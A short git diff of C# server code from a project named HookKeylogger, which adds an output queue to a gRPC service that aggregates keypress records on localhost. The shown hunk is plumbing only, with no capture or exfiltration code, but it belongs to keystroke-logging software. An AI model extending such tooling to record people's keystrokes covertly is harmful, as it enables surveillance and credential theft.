@@ -1,4 +1,5 @@
-﻿using HookKeylogger.Base;
+﻿using HookKeylogger.AggergationServer.Types;
+using HookKeylogger.Base;
 using System;
 using System.Collections.Concurrent;
 using System.Threading;
@@ -20,13 +21,14 @@ namespace KeypressAggregator
             string addr = "localhost";
 
             ConcurrentQueue<KeyPress> inputbuffer = new ConcurrentQueue<KeyPress>();
+            ConcurrentQueue<CI> outbuffer = new ConcurrentQueue<CI>();
             Grpc.Core.Server server = new Grpc.Core.Server
             {
                 Services = { HookKeylogger.Base.KerPressAggergator.BindService(new KeyPressAggergatorImpl(inputbuffer)) },
                 Ports = { new Grpc.Core.ServerPort(addr, port, Grpc.Core.ServerCredentials.Insecure) }
             };
 
-            KeyPressAggergator ksa = new KeyPressAggergator(inputbuffer);
+            KeyPressAggergator ksa = new KeyPressAggergator(inputbuffer, outbuffer);
 
             Thread aggergationThread = new Thread(new ThreadStart(ksa.Scan));
             aggergationThread.Start();
